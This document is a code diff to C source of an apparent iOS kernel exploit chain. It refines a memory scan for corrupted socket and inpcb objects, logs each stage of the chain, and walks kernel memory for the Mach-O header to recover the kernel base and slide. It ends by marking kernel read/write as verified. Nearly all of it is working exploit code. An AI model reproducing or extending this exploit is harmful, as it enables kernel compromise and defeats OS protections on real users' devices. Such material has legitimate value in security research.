@@ -17,6 +17,16 @@
 cs2_offsets_t cs2_offsets;
 cs2_context_t cs2_ctx;
 
+/* LSWCHAIN receipts: exactly one line per rung. rung 1 window, 2 pair,
+   3 corrupt-verified, 4 kbase, 5 rw_verified. */
+void cs2_chain_rung_log(int rung, const char *what, uint64_t a, uint64_t b) {
+    if (rung >= 1 && rung > cs2_ctx.chain_rung) cs2_ctx.chain_rung = rung;
+    LOG("[chain] rung=%d %s a=0x%llx b=0x%llx verified=%d",
+        rung, what ? what : "?",
+        (unsigned long long)a, (unsigned long long)b,
+        cs2_ctx.rw_verified);
+}
+
 /* LSWARM-TARGET: filled by the ObjC runner from Documents/lightsword_wrong.txt
    before cs2_run() (see cs2/common.h note). */
 uint64_t g_lsw_wrong_offs[16];
@@ -258,6 +268,7 @@ kern_return_t cs2_pe_v1(void) {
                SKIP the blind sweep for this mapping (tonight's sweep froze
                past deadline with the target layer already proven). */
             int lswProven = 0;
+            uint64_t lswHitOff = 0;
             for (int li = 0; li < g_lsw_wrong_n; li++) {
                 size_t lt = (size_t)(g_lsw_wrong_offs[li] & ~((uint64_t)vm_page_size - 1));
                 if (lt >= search_mapping_size) continue;
@@ -277,6 +288,7 @@ kern_return_t cs2_pe_v1(void) {
                 /* foreign content (not our marker) = target layer proven */
                 if (lkr == KERN_SUCCESS && lq0 != cs2_ctx.random_marker) {
                     lswProven = 1;
+                    lswHitOff = lt;
                     /* [lswarm-cls] static-verified fingerprints (23F77 audit
                        2026-11-15): inpcb record = qword+0x38 AND +0x40 both
                        kernel-range at a 0x400 boundary; socket object =
@@ -302,6 +314,9 @@ kern_return_t cs2_pe_v1(void) {
                         }
                         LOG("[lswarm-cls] map=%lu off=0x%zx kq=%d inpcb_cand=0x%x sock_cand=0x%x (0x400 stride, static-verified)",
                             s, lt, kq, (unsigned)ipc_cand, (unsigned)so_cand);
+                        cs2_chain_rung_log(1,
+                            (ipc_cand >= 0 || so_cand >= 0) ? "window+target-cand" : "window-only",
+                            lt, (uint64_t)kq);
                     }
                     for (int nb = -3; nb <= 3 && !success; nb++) {
                         if (nb == 0) continue;
@@ -327,13 +342,15 @@ kern_return_t cs2_pe_v1(void) {
             if (success) break;
 
             // start the party
-            uint64_t seeking_offset = 0;
-            /* v15 freeze law: target layer proven + pcb hunt ran — the blind
-               sweep adds nothing and burned the deadline (22:47 receipts) */
-            if (lswProven) {
-                LOG("[lswarm] map=%lu target layer PROVEN, pcb neighborhood hunted — sweep skipped", s);
-                seeking_offset = search_mapping_size;
-            }
+            /* LSWCHAIN (2026-11-16 USB receipts): a proven window RESUMES the
+               sweep at the hit page instead of skipping the mapping. The
+               windows read wholesale foreign socket-buffer content with no
+               inpcb class, so the pair lives a few pages away — skipping
+               threw that evidence away, and restarting at 0 re-read
+               everything. Resume is the middle path. */
+            uint64_t seeking_offset = lswProven ? (lswHitOff & ~((uint64_t)vm_page_size - 1)) : 0;
+            if (lswProven)
+                LOG("[lswarm] map=%lu resuming sweep at hit 0x%llx (window proven; hunt continues)", s, (unsigned long long)seeking_offset);
 
             // seeking offset increases by page_size, until search_mapping_size
             // since search_mapping_size is 0x8000000, we can loop 0x2000 times
@@ -488,6 +505,7 @@ kern_return_t cs2_pe(void) {
     close(cs2_ctx.read_fd);
     if (cs2_ctx.rw_socket_pcb == 0 || cs2_ctx.control_socket <= 0) {
         LOG_ERR("no pcb / control socket after scan — skip kernel_base walk (kaddr 0x20 is inpcb field# garbage)");
+        cs2_chain_rung_log(2, "no-pair", cs2_ctx.success_read_count, 0);
         return KERN_FAILURE;
     }
     cs2_ctx.control_socket_pcb = cs2_early_kread64(cs2_ctx.rw_socket_pcb + koffsetof(inpcb, list_next));
@@ -506,36 +524,43 @@ kern_return_t cs2_pe(void) {
     
     uint64_t kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
     uint64_t walk_tries = 0;
+    int walk_rejects = 0;
     while (true) {
         // lab: bounded walk (upstream would spin forever if kread returns 0)
         if (++walk_tries > 0x4000 || cs2_expired()) {
-            LOG_ERR("kernel_base walk exhausted after %#llx pages", (unsigned long long)walk_tries);
+            LOG_ERR("kernel_base walk exhausted after %#llx pages (last=0x%llx) — no magic through the corrupted socket",
+                    (unsigned long long)walk_tries, (unsigned long long)kernel_base);
+            cs2_chain_rung_log(4, "walk-exhausted", kernel_base, walk_tries);
             return KERN_FAILURE;
         }
         //PRINT_VAR(kernel_base);
-        if (cs2_early_kread64(kernel_base) == 0x100000cfeedfacf) {
-            uint64_t typeinfo = cs2_early_kread64(kernel_base + 8);
-            
-            if (cs2_is_arm64e()) {
-                if (__builtin_available(iOS 19.0, *)) {
-                    if (typeinfo == 0xcc0000002) break;
-                }
-                else if (__builtin_available(iOS 16.0, *)) {
-                    if (typeinfo == 0xc00000002) break;
-                }
-                else {
-                    break;
-                }
+        uint64_t hdr = 0;
+        if (cs2_early_kread64_ok(kernel_base, &hdr) != 0) {
+            kernel_base -= PAGE_SIZE;   /* a failed read is never a magic */
+            continue;
+        }
+        if (hdr == 0x100000cfeedfacf) {
+            uint64_t typeinfo = 0;
+            (void)cs2_early_kread64_ok(kernel_base + 8, &typeinfo);
+            /* Board law set (LuminaMHTypeinfoOK) — the old availability
+               ladder accepted only ONE value on 26.x. */
+            if (typeinfo == 0x200000000 || typeinfo == 0xc00000002 || typeinfo == 0xcc0000002) {
+                LOG("[chain] rung=4 kbase=0x%llx magic=0x%llx typeinfo=0x%llx pages=%llu",
+                    (unsigned long long)kernel_base, (unsigned long long)hdr,
+                    (unsigned long long)typeinfo, (unsigned long long)walk_tries);
+                break;
             }
-            else {
-                if (typeinfo == 0x200000000) break;
-            }
+            if (walk_rejects++ < 4)
+                LOG("[chain] rung=4 magic at 0x%llx but typeinfo=0x%llx outside {0x200000000,0xc00000002,0xcc0000002}",
+                    (unsigned long long)kernel_base, (unsigned long long)typeinfo);
         }
         kernel_base -= PAGE_SIZE;
     }
 
     cs2_ctx.kernel_base = kernel_base;
     cs2_ctx.kernel_slide = kernel_base - kconstant(staticBase);
+    cs2_ctx.rw_verified = 1;
+    cs2_chain_rung_log(5, "rw_verified", cs2_ctx.kernel_base, cs2_ctx.kernel_slide);
 
     // real cleanup
     cs2_sockets_leak_forever();
